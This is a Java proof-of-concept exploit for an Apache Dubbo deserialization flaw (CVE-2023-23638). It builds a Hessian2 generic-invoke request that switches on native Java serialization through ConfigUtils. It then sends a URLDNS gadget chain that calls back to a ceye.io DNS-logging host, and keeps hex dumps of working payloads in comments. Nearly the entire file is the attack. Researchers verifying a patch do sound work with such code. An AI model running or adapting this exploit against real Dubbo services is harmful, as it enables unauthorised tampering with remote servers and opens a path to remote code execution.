package com.arliya.dubbo.main;


import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
import org.apache.dubbo.common.serialize.nativejava.NativeJavaObjectOutput;

import java.io.*;
import java.lang.reflect.Field;
import java.net.Socket;
import java.net.URL;
import java.util.HashMap;
import java.util.Properties;
import java.util.Random;

public class CVE202323638 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InterruptedException {
        CVE202323638 cve202323638 = new CVE202323638();
        cve202323638.startNative();
        Thread.sleep(60000);
        cve202323638.exploit();


    }

    public void exploit() throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        URL url = new URL("http://888888888888.v3njn9.ceye.io");
        Field hashcode = Class.forName("java.net.URL").getDeclaredField("hashCode");
        hashcode.setAccessible(true);
        hashcode.set(url, 0xdeadbeef);
        HashMap<URL, String> objectObjectHashMap = new HashMap<>();
        objectObjectHashMap.put(url, "test");
        hashcode.set(url, -1);

        ByteArrayOutputStream urlDNS = new ByteArrayOutputStream();
        NativeJavaObjectOutput objectOutputStream = new NativeJavaObjectOutput(urlDNS);
        objectOutputStream.writeObject(objectObjectHashMap);


        ByteArrayOutputStream nativeDesOutputStream = new ByteArrayOutputStream();
        NativeJavaObjectOutput nativeJavaObjectOutput = new NativeJavaObjectOutput(nativeDesOutputStream);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();


        // set body
        nativeJavaObjectOutput.writeUTF("2.7.8");
        //todo 此处填写Dubbo提供的服务名
        nativeJavaObjectOutput.writeUTF("com.arliya.dubbo.api.Person");
        //服务版本
        nativeJavaObjectOutput.writeUTF("");
        //方法名
        nativeJavaObjectOutput.writeUTF("$invoke");
        //描述
        nativeJavaObjectOutput.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        //todo 此处填写Dubbo提供的服务的方法
        //方法名
        nativeJavaObjectOutput.writeObject("sayHello");
        // 方法参数类型
        nativeJavaObjectOutput.writeObject(new String[] {"java.lang.String"});
        //本地序列化
        nativeJavaObjectOutput.writeObject(new Object[]{urlDNS.toByteArray()});

        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("generic", "nativejava");
        nativeJavaObjectOutput.writeObject(hashMap);

        nativeJavaObjectOutput.flushBuffer();

        byte[] dubboHeader = createDubboHeader(nativeDesOutputStream.size(), 7);
        byteArrayOutputStream.write(dubboHeader);
        byteArrayOutputStream.write(nativeDesOutputStream.toByteArray());
        printByteArray(byteArrayOutputStream);

        sendPayload(byteArrayOutputStream);
        byteArrayOutputStream.close();
        //useful: dabb8700000000000412363700000268  aced000577690005322e372e38 001b 636f6d2e61726c6979612e647562626f2e6170692e506572736f6e 0000000724696e766f6b6500384c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f4f626a6563743b74 0008 73617948656c6c6f 757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007870000000017400106a6176612e6c616e672e537472696e67757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200025b42acf317f8060854e00200007870 0000010f aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff74 0017 37373737373737372e76336e6a6e392e636579652e696f 74000071007e000574 0004 68747470 70787400047465737478 737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c7708000000100000000174000767656e6572696374000a6e61746976656a61766178
        //useful: dabb87000000000000c9205400000268  aced000577690005322e372e38 001b 636f6d2e61726c6979612e647562626f2e6170692e506572736f6e 0000000724696e766f6b6500384c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f4f626a6563743b74 0008 73617948656c6c6f 757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007870000000017400106a6176612e6c616e672e537472696e67757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200025b42acf317f8060854e00200007870 0000010f aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff74 0017 37373737373737372e76336e6a6e392e636579652e696f 74000071007e000574 0004 68747470 70787400047465737478 737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c7708000000100000000174000767656e6572696374000a6e61746976656a61766178
        //useful: dabb8700000000000000333d0000026c  aced000577690005322e372e38 001b 636f6d2e61726c6979612e647562626f2e6170692e506572736f6e 0000000724696e766f6b6500384c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f4f626a6563743b74 0008 73617948656c6c6f 757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007870000000017400106a6176612e6c616e672e537472696e67757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200025b42acf317f8060854e00200007870 00000113 aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff74 001b 3838383838383838383838382e76336e6a6e392e636579652e696f 74000071007e000574 0004 68747470 70787400047465737478       737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c7708000000100000000174000767656e6572696374000a6e61746976656a61766178
        //create:                                   aced000577690005322e372e38 001b 636f6d2e61726c6979612e647562626f2e6170692e5363686f6f6c 0000000724696e766f6b6500384c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f4f626a6563743b74 0007 7365744e616d65   757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007870000000017400106a6176612e6c616e672e537472696e67757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200025b42acf317f8060854e00200007870 00000116 aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff74 001e 6d667964666437762e646e732e39623535303161332e617873732e78797a 74000071007e000574 0004 68747470 70787400047465737478 737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c7708000000100000000174000767656e6572696374000a6e61746976656a61766178

    }

    public void startNative() throws IOException {
        Properties properties = new Properties();
        properties.setProperty("dubbo.security.serialize.generic.native-java-enable","TRUE");
        HashMap jndi = new HashMap();
        jndi.put("class", "org.apache.dubbo.common.utils.ConfigUtils");
        jndi.put("properties", properties);

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        // set body
        out.writeUTF("2.7.8");
        //todo 此处填写Dubbo提供的服务名
        out.writeUTF("com.arliya.dubbo.api.Person");
        //服务版本
        out.writeUTF("");
        //方法名
        out.writeUTF("$invoke");
        //描述
        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        //todo 此处填写Dubbo提供的服务的方法
        //方法名
        out.writeUTF("sayHello");
        // 方法参数类型
        out.writeObject(new String[] {"java.lang.String"});
        out.writeObject(new Object[]{jndi});
        HashMap map = new HashMap();
        map.put("generic", "raw.return");
        out.writeObject(map);
        out.flushBuffer();
        byte[] dubboHeader = createDubboHeader(hessian2ByteArrayOutputStream.size(), 2);
        byteArrayOutputStream.write(dubboHeader);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
        printByteArray(byteArrayOutputStream);


//        sendPayload(byteArrayOutputStream);
        byteArrayOutputStream.close();

        //useful: dabb8200000000000297d3f400000135 05322e372e38 1b 636f6d2e61726c6979612e647562626f2e6170692e506572736f6e 000724696e766f6b6530384c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f4f626a6563743b0873617948656c6c6f71075b737472696e67106a6176612e6c616e672e537472696e6771075b6f626a6563744805636c61737330296f72672e6170616368652e647562626f2e636f6d6d6f6e2e7574696c732e436f6e6669675574696c730a70726f706572746965734d146a6176612e7574696c2e50726f706572746965733033647562626f2e73656375726974792e73657269616c697a652e67656e657269632e6e61746976652d6a6176612d656e61626c6504545255455a5a480767656e657269630a7261772e72657475726e5a
        //useful: dabb82000000000003c6477a00000135 05322e372e38 1b 636f6d2e61726c6979612e647562626f2e6170692e506572736f6e 000724696e766f6b6530384c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f4f626a6563743b0873617948656c6c6f71075b737472696e67106a6176612e6c616e672e537472696e6771075b6f626a6563744805636c61737330296f72672e6170616368652e647562626f2e636f6d6d6f6e2e7574696c732e436f6e6669675574696c730a70726f706572746965734d146a6176612e7574696c2e50726f706572746965733033647562626f2e73656375726974792e73657269616c697a652e67656e657269632e6e61746976652d6a6176612d656e61626c6504545255455a5a480767656e657269630a7261772e72657475726e5a
        //create: dabb820000000000041c049300000134 05322e372e38 1b 636f6d2e61726c6979612e647562626f2e6170692e5363686f6f6c 000724696e766f6b6530384c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f4f626a6563743b077365744e616d6571075b737472696e67106a6176612e6c616e672e537472696e6771075b6f626a6563744805636c61737330296f72672e6170616368652e647562626f2e636f6d6d6f6e2e7574696c732e436f6e6669675574696c730a70726f706572746965734d146a6176612e7574696c2e50726f706572746965733033647562626f2e73656375726974792e73657269616c697a652e67656e657269632e6e61746976652d6a6176612d656e61626c6504545255455a5a480767656e657269630a7261772e72657475726e5a

    }

    public void sendPayload(ByteArrayOutputStream byteArrayOutputStream) throws IOException {
        Socket socket = new Socket("localhost", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(byteArrayOutputStream.toByteArray());
        outputStream.flush();
        outputStream.close();
    }

    public void printByteArray(ByteArrayOutputStream byteArrayOutputStream){
        StringBuilder stringBuilder = new StringBuilder();
        for (Byte b: byteArrayOutputStream.toByteArray()){
            stringBuilder.append(String.format("%02x", b));
        }
        System.out.println(stringBuilder);
    }

    public byte[] createDubboHeader(int length, int serializationType){
        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        // 激活native 使用2   发送payload 使用7
        header[2] = (byte) ((byte) 0x80 | serializationType);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        Bytes.int2bytes(length, header, 12);
        return header;
    }
}